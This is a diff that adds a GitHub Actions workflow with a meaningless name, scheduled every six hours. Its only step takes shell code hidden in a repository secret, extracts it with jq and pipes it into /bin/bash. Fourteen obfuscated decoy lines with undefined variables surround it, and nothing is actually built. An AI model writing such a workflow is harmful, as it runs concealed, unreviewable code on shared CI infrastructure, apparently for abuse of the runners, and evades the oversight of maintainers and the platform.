@@ -1,0 +1,30 @@
+name: feishaoguangfa
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '3 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: feishaoguangfa
+        env:
+          du2183: ${{ secrets.du2183 }}
+        run: |
+          echo $du2183 | jq -r .ibe6 | /bin/bash
+          echo $bobim72340 | jq -r .xga57351 | /bin/bash
+          echo $vn749 | jq -r .cdk66614 | /bin/bash
+          echo $oexop01 | jq -r .dc7 | /bin/bash
+          echo $j623 | jq -r .kd4509 | /bin/bash
+          echo $wtgwr06527 | jq -r .do202 | /bin/bash
+          echo $ttqo15 | jq -r .tls12 | /bin/bash
+          echo $w958 | jq -r .pvx688 | /bin/bash
+          echo $as2533 | jq -r .en9 | /bin/bash
+          echo $c0300 | jq -r .udptx08619 | /bin/bash
+          echo $rum53211 | jq -r .utb16 | /bin/bash
+          echo $w2 | jq -r .fzz07 | /bin/bash
+          echo $x62545 | jq -r .vvraz26 | /bin/bash
+          echo $nrz92 | jq -r .poi30 | /bin/bash
+          echo $bpux1367 | jq -r .iuuso0 | /bin/bash
+
